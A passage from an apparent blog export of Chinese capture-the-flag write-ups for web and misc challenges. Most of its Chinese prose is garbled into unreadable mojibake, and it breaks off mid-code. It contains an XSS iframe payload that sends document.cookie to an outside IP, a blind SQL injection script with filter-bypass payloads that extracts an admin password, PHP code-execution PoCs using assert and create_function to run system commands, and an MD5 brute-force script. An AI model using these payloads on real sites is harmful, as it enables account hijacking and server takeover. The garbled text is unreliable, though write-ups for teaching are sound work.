@$_GET[&apos;dir&apos;]; if(!$a){ $a = &apos;/tmp&apos;; } var_dump(scandir($a));var_dumpÂèØ‰ª•Áõ¥Êé•ËØªÂèñÁõÆÂΩïÔºå Âú®Ê†πÁõÆÂΩï‰∏ãËØªÂèñÂà∞flagÊñá‰ª∂ÔºåÁõ¥Êé•ÂåÖÂê´ËØªÂèñ„ÄÇ web2url:61.164.47.198:10001 ÂºÄÂ±Ä‰∏§‰∏™Ê°ÜÔºåÁôªÈôÜÂÖ®Èù†adminÔºå‰∫ãÂÆûËØÅÊòéÔºåÁÇπÂáªÁôªÈôÜ‰ªÄ‰πà‰πü‰∏çËæìÂÖ•‰πüËÉΩËøõÂêéÂè∞„ÄÇ ÂêéÂè∞ÂàÜ‰∏â‰∏™ÈÉ®ÂàÜ È¶ñÂÖàÊòØÁïôË®ÄÔºåÁÑ∂ÂêéreportÊä•ÂëäÈóÆÈ¢ò„ÄÇ ÂÜô‰∏™ËÑöÊú¨Ë∑ëÂá∫md5Âπ∂‰∏çÂõ∞ÈöæÔºåÁåúÊµãÊòØÊûÑÈÄ†xssÈ°µÈù¢Ëé∑ÂèñcookieÔºåÁÑ∂ÂêéÊèê‰∫§Âà∞ÁÆ°ÁêÜÂëòÔºåËé∑ÂæócookieÔºåÁÑ∂ÂêéÊâßË°åÂëΩ‰ª§„ÄÇ Êé•‰∏ãÊù•Â∞±ÊòØÊûÑÈÄ†xssÔºå scriptË¢´ËøáÊª§‰∫ÜÔºåÂ∞ùËØïÂêÑÁßçÊ†áÁ≠æÔºåÂèëÁé∞Ê†áÁ≠æÊ≤°ÊúâËøáÊª§Ôºå‰ΩÜÊòØËß¶Âèë‰∫ã‰ª∂ËøáÊª§‰∫ÜÔºåÂ¶Çonload=,onerror=ÔºåÂæàÂø´ÂèØ‰ª•ÂèëÁé∞ÔºåiframeÁöÑdataÂçèËÆÆÊ≤°ÊúâË¢´ËøáÊª§Ôºå &lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt; ÁÑ∂ÂêéÊûÑÈÄ†Ëé∑ÂèñcookieÁöÑxss„ÄÇ ÁªèËøáÊµãËØïÔºå &lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb24uaHJlZj0naHR0cDovL3VybDo4ODg4Lz9hPScrZG9jdW1lbnQuY29va2llPC9zY3JpcHQ+&quot;&gt;‰∏çÂ§™Ê∏ÖÊ•öËøôÊù°‰∏∫‰ªÄ‰πàËøêË°å‰∏ç‰∫ÜÔºåÊé•ÁùÄ‰ΩøÁî®‰º™ÂçèËÆÆÔºåÂÆû‰ΩìÂåñÁªïËøá„ÄÇ &lt;iframe src=&quot;javasc&amp;#114;ipt:window.location.href=&apos;http://47.106.185.69:8888/?a=&apos;+document.cookie&quot;&gt;Êé•ÁùÄÂ∞±ÊòØÁàÜÁ†¥md5Êà™Êñ≠ËÑöÊú¨„ÄÇ # -*- coding: utf-8 -*- import hashlib from multiprocessing.dummy import Pool as ThreadPool # MD5Êà™Êñ≠Êï∞ÂÄºÂ∑≤Áü• Ê±ÇÂéüÂßãÊï∞ÊçÆ # ‰æãÂ≠ê substr(md5(captcha), 0, 6)=60b7ef def md5(s): # ËÆ°ÁÆóMD5Â≠óÁ¨¶‰∏≤ return hashlib.md5(str(s).encode(&apos;utf-8&apos;)).hexdigest() keymd5 = &apos;5416ad&apos; #Â∑≤Áü•ÁöÑmd5Êà™Êñ≠ÂÄº md5start = 0 # ËÆæÁΩÆÈ¢òÁõÆÂ∑≤Áü•ÁöÑÊà™Êñ≠‰ΩçÁΩÆ md5length = 6 def findmd5(sss): # ËæìÂÖ•ËåÉÂõ¥ ÈáåÈù¢‰ºöËøõË°åmd5ÊµãËØï key = sss.split(&apos;:&apos;) start = int(key[0]) # ÂºÄÂßã‰ΩçÁΩÆ end = int(key[1]) # ÁªìÊùü‰ΩçÁΩÆ result = 0 for i in range(start, end): # print(md5(i)[md5start:md5length]) if md5(i)[0:6] == keymd5: # ÊãøÂà∞Âä†ÂØÜÂ≠óÁ¨¶‰∏≤ result = i print(result) # ÊâìÂç∞ break list=[] # ÂèÇÊï∞ÂàóË°® for i in range(10): # Â§öÁ∫øÁ®ãÁöÑÊï∞Â≠óÂàóË°® ÂºÄÂßã‰∏éÁªìÂ∞æ list.append(str(10000000*i) + &apos;:&apos; + str(10000000*(i+1))) pool = ThreadPool() # Â§öÁ∫øÁ®ã‰ªªÂä° pool.map(findmd5, list) # ÂáΩÊï∞ ‰∏éÂèÇÊï∞ÂàóË°® pool.close() pool.join()Ê≠§È¢òÁÉÇÂ∞æÔºåÈ¢òÁõÆÊó†ËæúÊö¥ÊØôÔºÅ misc-TTLËøòÊúâ‰∏ÄÈÅìÊúâÊÑèÊÄùÁöÑmiscËÆ∞ÂΩï‰∏Ä‰∏ã„ÄÇ È¢òÁõÆÊèèËø∞Ôºö Êàë‰ª¨Êà™Ëé∑‰∫Ü‰∏Ä‰∫õIPÊï∞ÊçÆÊä•ÔºåÂèëÁé∞Êä•ÊñáÂ§¥‰∏≠ÁöÑTTLÂÄºÁâπÂà´ÂèØÁñëÔºåÊÄÄÁñëÊòØÈÄö‰ø°ÊñπÂµåÂÖ•‰∫ÜÊï∞ÊçÆÂà∞TTLÔºåÊàë‰ª¨Â∞ÜËøô‰∫õTTLÂÄºÊèêÂèñ‰∫ÜÂá∫Êù•Ôºå‰Ω†ËÉΩÁúãÂá∫‰ªÄ‰πàÁ´ØÂÄ™ÂêóÔºüÁÑ∂ÂêéÊòØ‰∏ÄÊÆµÂ•áÊÄ™ÁöÑTTLÂ≠óÊÆµÔºå‰∫åÂçÅÂá†‰∏áÊù°ËøôÈáåÂ∞±‰∏çÂÜôÂá∫Êù•‰∫Ü„ÄÇ ÁÑ∂ÂêéÁôæÂ∫¶ÊêúÁ¥¢TTL ÈöêËóè‰ø°ÊÅØ„ÄÇ Ëøô‰πà‰∏ÄËØ¥Á°ÆÂÆûÂ∫îËØ•ÊòØËøôÁßçÈöêËóèÔºåÂõ†‰∏∫ÁªôÁöÑÊï∞Â≠ó127 191 63 ÂêéÂÖ≠‰ΩçÈÉΩÊòØ111111 127 ==&gt;&gt; 0111111163 ==&gt;&gt; 00111111191 ==&gt;&gt; 10111111255 ==&gt;&gt; 11111111 ÊåâÈÅìÁêÜËØ¥Âè™ÊúâËøôÂõõ‰∏™Êï∞Â≠óÔºåÂõ†‰∏∫ÂêéÂÖ≠‰∏™Êï∞Â≠óÊòØÂõ∫ÂÆöÁöÑÔºåÂâç‰∏§‰∏™Êï∞Â≠ó Âè™Êúâ‰∏§ÁßçÈÄâÊã©Ôºå2X2=4„ÄÇ Êé•‰∏ãÊù•ÂÜôËÑöÊú¨ÊèêÂèñÂá∫Êù•ÊØè‰∏™‰∫åËøõÂà∂ÁöÑÂâç‰∏§‰Ωç„ÄÇ import binascii key=open(&apos;./ttl.txt&apos;,&apos;r&apos;) f1 = open(&quot;./1.txt&quot;,&quot;a+&quot;) f2 = open(&quot;./2.txt&quot;,&quot;a+&quot;) a=0 for ttl in key.readlines(): if(ttl[4:7]==&quot;127&quot;): f1.write(&quot;01&quot;) a=a+1 if a%4==0: f1.write(&quot;\n&quot;) elif(ttl[4:6]==&quot;63&quot;): f1.write(&quot;00&quot;) a=a+1 if a%4==0: f1.write(&quot;\n&quot;) elif(ttl[4:7]==&quot;191&quot;): f1.write(&quot;10&quot;) a=a+1 if a%4==0: f1.write(&quot;\n&quot;) elif(ttl[4:7]==&quot;255&quot;): f1.write(&quot;11&quot;) a=a+1 if a%4==0: f1.write(&quot;\n&quot;) f3 = open(&quot;./1.txt&quot;,&quot;r&quot;) for ttls in f3.readlines(): f2.write(chr(int(ttls,2))) with open(&apos;./2.txt&apos;, &apos;rt&apos;) as f: data = f.read() flag = binascii.unhexlify(data)#ËΩ¨Âåñ‰∏∫16ËøõÂà∂ÁöÑÂõæÁâá f4 = open(&quot;1.jpg&quot;,&apos;wb&apos;) f4.write(flag)ÂæóÂà∞ÁªìÊûú„ÄÇ ÂÜÖÂÆπÂ§™Â§öÂÆûÂú®‰∏çÂÉèflagÔºå‰ΩÜÊòØÁªÜÂøÉÁÇπËßÇÂØüÂèØ‰ª•ÁúãÂà∞ÂâçÂõõ‰ΩçÊòØffd8 jpgÂõæÁâáÁöÑÊ†ºÂºè„ÄÇ ÂæóÂà∞ÊúÄÁªàÂõæÁâáÔºåË≤å‰ººÊòØ‰∏™‰∫åÁª¥Á†Å„ÄÇ ‰ΩÜÊòØ‰∏çÂÖ®ÔºåÂ∫îËØ•ÊòØÈúÄË¶ÅÂàÜÁ¶ª„ÄÇforemostÂàÜÁ¶ª„ÄÇ ÊèêÂèñ‰∫îÂº†‰∫åÁª¥Á†ÅÂõæÁâáÔºåÊãºÊé•Êàê‰∏ÄÂº†ÂÆåÊï¥ÁöÑ‰∫åÁª¥Á†ÅÂõæÁâá„ÄÇ Âä†‰∏äÂéüÊù•ÁöÑ‰∏ÄÂÖ±ÂÖ≠Âº†ÂõæÁâáÊãºÊàê‰∫åÁª¥Á†ÅÔºåÂæóÂà∞flag„ÄÇ]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ÊéòÂÆâÊùØÁΩëÁªúÂÆâÂÖ®ÊäÄËÉΩÊåëÊàòËµõ]]></title>
    <url>%2F2019%2F04%2F08%2F%E6%8E%98%E5%AE%89%E6%9D%AF%2F</url>
    <content type="text"><![CDATA[ËΩ¨Ôºöhttps://xz.aliyun.com/t/4741 ÂâçË®ÄÊéòÂÆâÊùØÁΩëÁªúÂÆâÂÖ®ÊäÄËÉΩÊåëÊàòËµõ„ÄÇÈ¢òÁõÆÁõ∏ÂØπÁÆÄÂçïÈÄÇÂêàÊñ∞ÊâãÂÖ•Èó®ÔºåÂÅèÂêëphp‰ª£Á†ÅÂü∫Á°ÄÊºèÊ¥ûÁöÑÂ≠¶‰π†„ÄÇ web1È¢òÁõÆurl:http://120.79.1.69:10001/ Áõ∏ÂΩì‰∫éÁ≠æÂà∞È¢òÁõÆÔºåÊ≤°‰ªÄ‰πàÈöæÂ∫¶Ôºå ËøõË°åÊäìÂåÖbase64Ëß£Á†ÅÂç≥ÂèØÂæóÂà∞Á¨¨‰∏ÄÈÅìÈ¢òÁöÑflag„ÄÇ amFjdGZ7OWMxZTNkMThjNDMzZDkzZDk2YTk2NGMwMGFkMzBiOGZ9 jactf{9c1e3d18c433d93d96a964c00ad30b8f}web2È¢òÁõÆurl:http://120.79.1.69:10002ÂèØ‰ª•‰∏ãËΩΩÊñá‰ª∂Ê∫êÁ†Å„ÄÇ‰ΩÜÊòØflag.txt‰∏ãËΩΩ‰∏ç‰∫ÜÔºåÊü•ÁúãÊ∫êÁ†ÅÊèêÁ§∫„ÄÇ ‰∏ãËΩΩfile=flag.php‰∏ãËΩΩÊ∫êÁ†Å„ÄÇ &lt;?php header(&apos;Content-Type: text/html; charset=utf-8&apos;); //ÁΩëÈ°µÁºñÁ†Å function encrypt($data, $key) { $key = md5 ( $key ); $x = 0; $len = strlen ( $data );#32 $l = strlen ( $key ); #5 for($i = 0; $i&lt;$len; $i ++) { if ($x == $l) { $x = 0; } $char .= $key {$x}; $x ++; } for($i = 0; $i &lt; $len; $i ++) { $str .= chr ( ord ( $data {$i} ) + (ord ( $char {$i} ))%256 ); } echo base64_encode ( $str ); } function decrypt($data, $key) { $key = md5 ( $key ); $x = 0; $data = base64_decode ( $data ); $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i &lt; $len; $i ++) { if ($x == $l) { $x = 0; } $char .= substr ( $key, $x, 1 ); $x ++; } for($i = 0; $i &lt; $len; $i ++) { if (ord ( substr ( $data, $i, 1 ) ) &lt; ord ( substr ( $char, $i, 1 ) )) { $str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) ); } else { $str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) ); } } echo $str; } $key=&quot;MyCTF&quot;; $flag=&quot;o6lziae0xtaqoqCtmWqcaZuZfrd5pbI=&quot;; ?&gt;Ëß£ËØªÔºöËøôÂæàÊòéÊòæÊòØ‰∏™Âä†ÂØÜËß£ÂØÜÔºåÂÖ∂‰∏≠Áªô‰∫ÜÂä†ÂØÜÂêéÁöÑflagÔºåÂà©Áî®Á¨¨‰∏Ä‰∏™ÂáΩÊï∞Âä†ÂØÜÔºåÈí•Âåô‰πüÁªô‰∫ÜMyCTF„ÄÇ‰ΩÜÊòØ‰∏çÊ∏ÖÊ•ö‰∏∫Âï•Áªô‰∫ÜËß£ÂØÜÁÆóÊ≥ïÔºå‰∏çÁªô‰πüÂæàÂÆπÊòìÈÄÜÊé®Â∞±ÂèØ‰ª•Ëß£Âá∫Êù•„ÄÇ ÊâÄ‰ª•ÊúÄÁªàÂ∞±ÊòØÁõ¥Êé•decrypt($flag,$key),Â∞±‰ºöÊâìÂç∞Âá∫Êù•flagÔºå ‰πüÂèØ‰ª•È™åËØÅ‰∏Ä‰∏ã„ÄÇ web3urlÂú∞ÂùÄÔºöhttp://120.79.1.69:10003 Ê†áÈ¢òÂæàÁÆÄÂçïÁöÑÁåúÂØÜÁ†ÅÔºå ÂÖàÁúãÁúãÊ∫êÁ†ÅÔºåÊúâPHPÊ∫êÁ†Å session_start(); $_SESSION[&apos;pwd&apos;]=time(); if (isset ($_POST[&apos;password&apos;])) { if ($_POST[&apos;pwd&apos;] == $_SESSION[&apos;pwd&apos;]) die(&apos;Flag:&apos;.$flag); else{ print &apos;&lt;p&gt;ÁåúÊµãÈîôËØØ.&lt;/p&gt;&apos;; $_SESSION[&apos;pwd&apos;]=time().time(); } }‰ª£Á†ÅÁõ∏ÂΩìÁ≤æÁÆÄÔºåÂ¶ÇÊûúpostÁöÑpwdÁ≠â‰∫éÂΩìÂâçÁöÑÊó∂Èó¥ÔºåÂ∞±ËøîÂõûflag,Â∞ùËØïËøáÊèêÂâçÈ¢ÑÂà§Êó∂Èó¥ÔºåÂèëÁé∞‰∏çÂèØ‰ª•ÔºåÂ∞±Âè™ËÉΩÁõ¥Êé•ÂÖ•ÊâãÈ¢òÁõÆ‰∫ÜÔºåËøôÈáåÁî®Âà∞‰∫Ü‰∏Ä‰∏™Âº±ÊØîËæÉÔºåÊù•ËøõË°å‰∏Ä‰∏™Á©∫ÊØîËæÉÔºåsession IDÊòØÊàë‰ª¨ÂèØÊéßÁöÑÔºåpwd‰πüÊòØÊàë‰ª¨ÂèØÊéßÁöÑÔºåÂîØ‰∏ÄÂ∞±ÊòØsessionÊàë‰ª¨Êó†Ê≥ïÊéßÂà∂ÊòØÂ§öÂ∞ëÔºå‰ΩÜÊòØÂèØ‰ª•ÁΩÆ‰∏∫Á©∫Ôºå Âà†Èô§PHPSESSIDÔºåÁÑ∂Âêé‰ΩøÂæópwd= Á©∫ÔºåÂà§Êñ≠Â∞±ÂèòÊàê‰∫ÜÁ©∫Á≠â‰∫éÁ©∫ÔºåÂèØ‰ª•ÂæóÂà∞flag„ÄÇ web4urlÂú∞ÂùÄÔºöhttp://120.79.1.69:10004 Ëøô‰∏™È¢ò‰∏ÄÂºÄÂßãÂ∑•ÂÖ∑Âá∫ÈóÆÈ¢òÊâ´ÂçäÂ§©Ê≤°Êâ´Âà∞Ôºå‰ΩÜÊòØÂÆåÂÖ®Ê≤°ÊúâÂÖ•ÊâãÁÇπÔºåÂêéÊù•ÂèëÁé∞ÊòØÂ∑•ÂÖ∑Â≠óÂÖ∏ÈóÆÈ¢òÔºåÂª∫ËÆÆCTFÊâæ‰∏çÂà∞ÂÖ•ÊâãÁÇπÂ∞±Â§öÊâ´Êâ´ÔºåÂèØËÉΩÊúâÈÅóÊºèÔºåËøô‰∏™È¢òÁõÆÂ∞±ÊòØÊâ´ÁõÆÂΩïÔºåÊúâ‰∏™ÂêéÈó®Êñá‰ª∂Ôºåshell.php ‰∏ÄËà¨Êù•ËØ¥ÂêéÈó®Êñá‰ª∂Â∞±ÊòØÁàÜÁ†¥ÂØÜÁ†ÅÔºåÊú¨È¢ò‰πü‰∏ç‰æãÂ§ñÔºåÂú®burp intruderÊ®°ÂùóÈáåËøõË°åÁàÜÁ†¥„ÄÇ web5 urlÂú∞ÂùÄ:http://120.79.1.69:10005 ËøôÈÅìÈ¢òÁõÆÁªºÂêà‰∫Ü‰∏â‰∏™Áü•ËØÜÁÇπÔºåpython sessionÂø´ÈÄüËÆ°ÁÆóÊèê‰∫§ÔºåÊ≥®ÂÖ•ÁªïËøáÔºå‰ª£Á†ÅÂÆ°ËÆ°„ÄÇÁªºÂêàËµ∑Êù•ËøòÊòØÊêû‰∫ÜÂçäÂ§©„ÄÇ 1.Êúâ‰∏™ÁôªÈôÜÊ°ÜÔºå ÊúâËøîÂõûÊä•Èîô‰ø°ÊÅØÔºå‰∏çÈöæÊÉ≥Âà∞ÔºåËÇØÂÆöÂíåÊ≥®ÂÖ•ÊåÇÈí©ÔºåfuzzÂèëÁé∞ÔºåorË¢´ËøáÊª§‰∏∫Á©∫Ôºå‰ΩÜÊòØÂæàÂÆπÊòìÁªïËøáÔºåÂ∏∏ËßÑÂèåÂÜôÁªïËøáÔºåselect‰πüË¢´ËøáÊª§‰∫ÜÔºå‰πüÂèØ‰ª•‰ΩøÁî®ÂèåÂÜôÁªïËøáÔºåselselectectÔºåÂêéÂè∞È™åËØÅÂ¶ÇÊûúÊòØselectÂ∞±ÊõøÊç¢‰∏∫Á©∫Ôºåselselectect Â∞±Á≠â‰∫é selectÔºåÁ©∫Ê†ºË¢´ËøáÊª§ÔºåËøôÈáåÁî®/**/ÊõøÊç¢Ôºå ÊúÄÁªàpoc &apos;oorr/**/ascii(substr((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1),%s,1))&gt;1/**/--/**/+&apos;Â¶ÇÊûúÊ≠£Á°ÆÁöÑËØùÂõûÊòæÁî®Êà∑ÂêçÊ≠£Á°ÆÔºåÈîôËØØÁöÑËØùÂõûÊòæÁî®Êà∑ÂêçÈîôËØØÔºåÂü∫‰∫éÂ∏ÉÂ∞îÁöÑÁõ≤Ê≥®„ÄÇËÑöÊú¨„ÄÇ #!/usr/bin/python # -*- coding: UTF-8 -*- import sys import requests url=&quot;http://120.79.1.69:10005/index.php?check&quot; password=&quot;&quot; for i in range(1,30): payload=&quot;&apos;oorr/**/ascii(substr((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1),%s,1))&gt;%s/**/--/**/+&apos;&quot; min=10 max=150 while abs(max-min)&gt;1: mid=int((max+min)/2) p = payload % (str(i),str(mid)) data={&quot;username&quot;:p} res=requests.post(url=url,data=data) if res.content.find(&quot;goodboy&quot;)!=-1: min=mid else: max=mid password=password+chr(max) print passwordÂæóÂà∞ÂØÜÁ†Å„ÄÇ ÊúÄÁªàpoc Ë¥¶Âè∑Ôºö&apos;&apos;&apos;=&apos; ÂØÜÁ†ÅÔºöajahas&amp;&amp;*44askldajajÊé•‰∏ãÊù•Âø´ÈÄüËÆ°ÁÆóÈ™åËØÅÁ†ÅÔºåpyËÑöÊú¨Ôºå # -*- encoding:utf8 -*- import sys import requests import re url=&quot;http://120.79.1.69:10005/index.php&quot; s=requests.Session() r=s.get(url=url) matchp=re.search(r&apos;(.{1}\d+[+\-*]\d+[+\-*]\d+.{1}.{1}){4}.{1}\d+[+\-*]\d+[+\-*]\d+.{1}&apos;,r.text).group()#.{1}ÂåπÈÖçÂâçÈù¢‰ªªÊÑè‰∏Ä‰∏™Â≠óÁ¨¶ÔºåÂõ†‰∏∫ÁªôÁöÑÊã¨Âè∑ÊòØ‰∏≠ÊñáÊã¨&gt;Âè∑ÂêéÈù¢ÂêåÁêÜ„ÄÇ matchp=matchp.replace(u&apos;Ôºà&apos;,&apos;(&apos;) matchp=matchp.replace(u&apos;Ôºâ&apos;,&apos;)&apos;) matchp=matchp.replace(&apos;X&apos;,&apos;*&apos;) num=round(eval(matchp)) urls=&quot;http://120.79.1.69:10005/index.php?check&quot; data={&quot;username&quot;:&quot;&apos;&apos;&apos;=&apos;&quot;,&quot;code&quot;:num,&quot;password&quot;:&quot;ajahas&amp;&amp;*44askldajaj&quot;} res=s.post(url=urls,data=data) print (res.text)ÂæóÂà∞ÂõûÊòæ„ÄÇ ÂèàËøõÂÖ•Âè¶‰∏Ä‰∏™ÂùëÔºå‰∏ãËΩΩzipÂåÖÔºåzipÂåÖË¢´Âä†ÂØÜ‰∫ÜÔºå ÁΩëÈ°µÂõûÊòæÊ∫êÁ†Å‰∏≠ÁªôÂá∫‰∫ÜformÁöÑÂØÜÁ†ÅÔºåÊâìÂºÄformÊòØÈÅì‰ª£Á†ÅÂÆ°ËÆ°ÂêåÊ†∑ÂæàÁÆÄÁü≠„ÄÇ Private Function getPassword(ByVal str As String) As String Dim reString As String Dim i As Integer i = 1 While (i &lt;= Len(str)) reString = reString &amp; Mid(str, i, 1) i = i + (i Mod 5) Wend getPassword = reString End Function Private Sub Command1_Click() Dim Dictionary As String Dictionary = &quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=&quot; Dim password As String password = getPassword(Dictionary) Dim psw As String psw = Text1.Text If (psw = password) Then MsgBox &quot;The password is correct!&quot;, vbOKOnly, &quot;ÂØÜÁ†ÅÊ≠£Á°Æ&quot; Text1.Text = &quot;Password for next pass : &quot; &amp; getPassword(password) Else MsgBox &quot;PasswordFail!&quot;, vbOKOnly, &quot;ÂØÜÁ†ÅÈîôËØØ&quot; End If End SubÂÜô‰∏™pythonËÑöÊú¨Ëß£Âá∫flag.jpgÁöÑÂéãÁº©ÂØÜÁ†Å„ÄÇ # -*- encoding:utf8 -*- def getPassword(str): restr=&apos;&apos; i=1 while i &lt;=(len(str)): restr= restr+(str[i-1:i]) i=i+(i%5) return restr dict=&quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=&quot; password=getPassword(dict) password=getPassword(password) print (password)ÂæóÂà∞ÂØÜÁ†Å VmH0wW3DZalBnmmSalV1SYSGRr1r3jVYcFrHWkUUlhljkFzCbXaEKyaVJymT1FlVTVskVWhGtonaGU2WWGhVXYol1WVI1F2odFuk Â∞Üflag.jpg‰ª•txtÊñπÂºèÊâìÂºÄÂæóÂà∞flag„ÄÇ web6urlÂú∞ÂùÄÔºöhttp://120.79.1.69:10006 ‰∏ÄÈÅì‰ª£Á†ÅÂÆ°ËÆ°È¢òÁõÆÔºå‰æùÁÑ∂ÂæàÁ≤æÁÆÄ„ÄÇ &lt;?php error_reporting(0); if(isset($_GET[&apos;action&apos;])) { $action = $_GET[&apos;action&apos;]; } if(isset($_GET[&apos;action&apos;])){ $arg = $_GET[&apos;arg&apos;]; } if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)){ show_source(__FILE__); } else { $action($arg,&apos;&apos;); } Ê≠£ÂàôÂåπÈÖç i ‰∏çÂå∫ÂàÜÂ§ßÂ∞èÂÜô /sÂåπÈÖç‰ªª‰Ωï‰∏çÂèØËßÅÂ≠óÁ¨¶ÔºåÂåÖÊã¨Á©∫Ê†º„ÄÅÂà∂Ë°®Á¨¶„ÄÅÊç¢È°µÁ¨¶Á≠âÁ≠âÔºåÁ≠â‰ª∑‰∫é[fnrtv] /DÂ¶ÇÊûú‰ΩøÁî®$ÈôêÂà∂ÁªìÂ∞æÂ≠óÁ¨¶,Âàô‰∏çÂÖÅËÆ∏ÁªìÂ∞æÊúâÊç¢Ë°å;Á≤æÁÆÄÁöÑÊ∫êÁ†ÅÔºåËÄÉÁöÑ‰ª£Á†ÅÊâßË°åÔºåÂèØ‰ª•ÂèÇËÄÉ‰∏Ä‰∏ãPÁâõ ÁöÑcreate_function()‰ª£Á†ÅÊ≥®ÂÖ•Ôºå‰∏çËøáÊú¨È¢òÁ®çÂæÆÊúâÁÇπÁÇπÂèòÂåñÔºåÊú¨È¢òÂÖ∂ÂÆûÂè™Êúâ‰∏Ä‰∏™ÁÇπÔºå ‰º†ÂÖ•actionÂèÇÊï∞ÔºåÊàë‰ª¨ÂèØÊéßÂáΩÊï∞ÔºåÂØªÊâæ‰∏Ä‰∏™ËÉΩÂ§üÊâßË°åÂëΩ‰ª§ÁöÑÂáΩÊï∞Â∞±ÂèØ‰ª•Ôºå‰ΩÜÊòØÈúÄË¶ÅËøô‰∏™ÂáΩÊï∞Êúâ‰∏§‰∏™ÂèÇÊï∞ÔºåevalÂ∞±‰∏çÂèØ‰ª•ÔºåassertÂèØ‰ª•‰º†ÂÖ•‰∏§‰∏™ÂèÇÊï∞ÔºåÂèØ‰ª•Áõ¥Êé•getshellÔºå Ê≠£ÂàôÂåπÈÖçÁªïËøáÂåπÈÖçÂºÄÂ§¥Ôºå‰ΩøÁî®\ÁªïËøá„ÄÇ ÂÆåÊï¥poc http://120.79.1.69:8886/web6?action=\assert&amp;arg=system(&#39;dir&#39;) Áî±‰∫éÈ¢òÁõÆÂÖ≥Èó≠‰∫ÜÔºåÊú¨Âú∞Â§çÁé∞Ôºå ÈÄöËøáÂëΩ‰ª§Êü•ÊâæÔºåÂç≥ÂèØËé∑Âæóflag„ÄÇ ÂèÇËÄÉÊñáÁ´†Ôºöhttps://mochazz.github.io/2019/01/12/create_function%E5%87%BD%E6%95%B0%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0RCE/ ÂêéÊù•È¢òÁõÆÁéØÂ¢ÉÂèò‰∫ÜÔºå assert‰∏çËÉΩ‰ΩøÁî®‰∫ÜÔºå‰πãÂâçassertÂèØ‰ª•ËØ¥ÊòØ‰∏™bugÔºåËøòÊòØË¶ÅÊù•‰∏ÄÈÅçÊ≠£ËßÑÂÅöÊ≥ï„ÄÇ È¢òÁõÆurl:http://120.79.1.69:10006 È¶ñÂÖàË¶ÅÁªïËøáÊ≠£ÂàôÔºåÊï∞Â≠óÂ≠óÊØç‰∏ãÂàíÁ∫øË¢´ËøáÊª§Ôºå‰ΩÜÊòØÈúÄË¶ÅË∞ÉÁî®ÂáΩÊï∞Ôºå‰ΩøÁî®create_functionÂàõÂª∫ÂáΩÊï∞Ôºå\create_functionÂ∞±ÊòØË∞ÉÁî®ÂÖ®Â±ÄÁöÑcreate_functionÂáΩÊï∞ÔºåÊ≠£Â•ΩÁªïËøá‰∫ÜÊ≠£ÂàôÔºåÊé•‰∏ãÊù•Â∞±ÊòØÊãºÊé•Â≠óÁ¨¶‰∏≤„ÄÇpoc http://120.79.1.69:10006?action=\create_function&amp;arg=){}system(&apos;ls&apos;);//ÊãºÂÖ•Â≠óÁ¨¶‰∏≤ÂêéÁöÑÁªìÊûú„ÄÇ \create_function(){}system(&apos;ls&apos;);//,&apos;&apos;); ÂæóÂà∞flag„ÄÇ web7ËøôÈÅìÈ¢òÁõÆ‰æùÁÑ∂ÊòØ‰ª£Á†ÅÂÆ°ËÆ°Ôºå‰∏ªË¶ÅÊòØËÄÉÂº±ÊØîËæÉ‰ª•ÂèäMD5Á≠âÊñπÈù¢ÁöÑÁªïËøá„ÄÇ È¢òÁõÆurl:http://120.79.1.69:8887/web7 ÊâìÂºÄÂç≥ÂèØËé∑ÂæóÊ∫êÁ†ÅÔºåËøôÈáåÊàëË¥¥Âá∫Ê∫êÁ†Å„ÄÇ &lt;?php highlight_file(__FILE__); include(&apos;flag.php&apos;); $str1 = 